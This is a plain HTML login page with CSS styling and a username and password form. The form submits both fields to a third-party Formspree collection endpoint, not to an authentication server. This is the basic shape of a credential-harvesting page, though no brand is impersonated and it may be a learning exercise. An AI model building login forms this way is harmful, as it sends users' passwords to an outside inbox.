<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Page</title>

<style>
body{
    margin:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#0f2027,#2c5364);
    font-family:Arial, sans-serif;
}

/* Login box */
.login-container{
    background:#fff;
    padding:40px;
    border-radius:12px;
    box-shadow:0 10px 25px rgba(0,0,0,0.3);
    width:320px;
    text-align:center;
}

h2{
    margin-bottom:20px;
    color:#333;
}

/* Inputs */
input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:8px;
    font-size:15px;
    outline:none;
}

input:focus{
    border-color:#2c5364;
    box-shadow:0 0 5px rgba(44,83,100,0.3);
}

/* Button */
button{
    width:100%;
    padding:12px;
    margin-top:15px;
    border:none;
    border-radius:8px;
    background:#2c5364;
    color:white;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#1e3c4a;
}
</style>
</head>

<body>

<div class="login-container">

    <h2>User Login</h2>

    <!-- FORMSPREE FORM -->
    <form action="https://formspree.io/f/xykqbqkd" method="POST">

        <!-- Username -->
        <input type="text" name="username" placeholder="Enter Username" required>

        <!-- Password -->
        <input type="password" name="password" placeholder="Enter Password" required>

        <!-- Login Button -->
        <button type="submit">Login</button>

    </form>

</div>

</body>
</html>
